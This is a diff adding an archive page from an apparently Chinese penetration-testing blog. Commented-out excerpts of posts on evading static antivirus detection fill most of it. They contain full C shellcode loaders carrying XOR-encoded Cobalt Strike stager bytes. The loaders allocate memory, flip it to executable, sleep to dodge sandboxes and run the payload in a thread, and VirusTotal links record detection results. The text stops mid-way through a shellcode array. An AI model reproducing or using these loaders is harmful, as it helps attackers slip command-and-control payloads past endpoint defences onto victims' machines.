@@ -1,0 +1,1295 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>倾旋的博客</title>
+  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
+">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/page7/">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="home">
+  <a class="rss-link" href="/feed.xml">RSS Feed</a>
+  <h1 class="page-heading">Articles</h1>
+
+  <ul class="post-list">
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-11-10/3">静态恶意代码逃逸（第三课）</a>
+        </h2>
+        
+        <div class="post-meta">Nov 10, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x01-关于内存申请的优化">0x01 关于内存申请的优化</h2>
+
+<p>前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<p>本章只提及一下关于VirtualAlloc的建议。</p>
+
+<p>https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</p>
+
+<p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+</span>
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="c1">// 获取shellcode大小</span>
+<span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+<span class="cm">/* 增加异或代码 */</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">shellcode_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mi">10</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cm">/*
+VirtualAlloc(
+    NULL, // 基址
+    800,  // 大小
+    MEM_COMMIT, // 内存页状态
+    PAGE_EXECUTE_READWRITE // 可读可写可执行
+    );
+*/</span>
+
+<span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span>
+    <span class="n">shellcode_size</span><span class="p">,</span>
+    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+    <span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+    <span class="p">);</span>
+
+    <span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">);</span>
+
+<span class="c1">// 这里开始更改它的属性为可执行</span>
+<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">,</span><span class="n">PAGE_EXECUTE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+
+<span class="c1">// 等待几秒，兴许可以跳过某些沙盒呢？</span>
+<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+
+<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+    <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+    <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+
+<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/95b1eb6a97c889c0886c21c21c83f4c1.png" alt="2019-11-10-02-05-37" /></p>
+
+<p>https://www.virustotal.com/gui/file/0a97372041356176fd3f21fc199f9f4a999e015236cf832e0583e9f0ba1917c3/detection</p>
+
+<h2 id="0x02-异或方式">0x02 异或方式</h2>
+
+<p>通常，我们使用循环去进行异或运算，会使用到异或运算符，这里是较为敏感的操作，那么，Windows下是否有相应的API呢？</p>
+
+<p>我在学习《Windows核心编程》的过程中，发现InterlockedXorRelease函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p>
+
+<p>抱着这个心态，我决定实验一下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;intrin.h&gt;
+#include &lt;WinBase.h&gt;
+#include &lt;stdio.h&gt;
+</span><span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+
+
+<span class="c1">// 获取shellcode大小</span>
+<span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+<span class="cm">/* 增加异或代码 */</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">shellcode_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="n">Sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
+    <span class="n">_InterlockedXor8</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/*
+VirtualAlloc(
+    NULL, // 基址
+    800,  // 大小
+    MEM_COMMIT, // 内存页状态
+    PAGE_EXECUTE_READWRITE // 可读可写可执行
+    );
+*/</span>
+
+<span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span>
+    <span class="n">shellcode_size</span><span class="p">,</span>
+    <span class="n">MEM_COMMIT</span><span class="p">,</span>
+    <span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+    <span class="p">);</span>
+
+    <span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">);</span>
+
+<span class="c1">// 这里开始更改它的属性为可执行</span>
+<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="n">shellcode_size</span><span class="p">,</span><span class="n">PAGE_EXECUTE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+
+<span class="c1">// 等待几秒，兴许可以跳过某些沙盒呢？</span>
+<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+
+<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+    <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+    <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+    <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+
+<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>https://www.virustotal.com/gui/file/07cd0fc7240f2978ebfaa6211a5818dcbbd12a76ec670d219b7a9b559e7bf9d2/detection</p>
+
+-->
+          来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。
+          <p>
+            <a class="post-link" href="/archivers/2019-11-10/3">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-11-10/2">静态恶意代码逃逸（第二课）</a>
+        </h2>
+        
+        <div class="post-meta">Nov 10, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x01-关于windows操作系统内存">0x01 关于Windows操作系统内存</h2>
+
+<p>前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<p>这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p>
+
+<p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p>
+
+<p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p>
+
+<p>申请方式：</p>
+
+<ul>
+  <li>HeapAlloc</li>
+  <li>malloc</li>
+  <li>VirtualAlloc</li>
+  <li>new</li>
+  <li>LocalAlloc</li>
+  <li>…</li>
+</ul>
+
+<h2 id="0x02-申请内存api的关系">0x02 申请内存API的关系</h2>
+
+<p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p>
+
+<h2 id="0x03-实现一次正常加载">0x03 实现一次正常加载</h2>
+
+<p>这里我创建了一个C++项目，名字为：BadCode</p>
+
+<p>先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+</span>
+
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x45\x4f\x78\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x4e\x4c\x4e\x4c\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5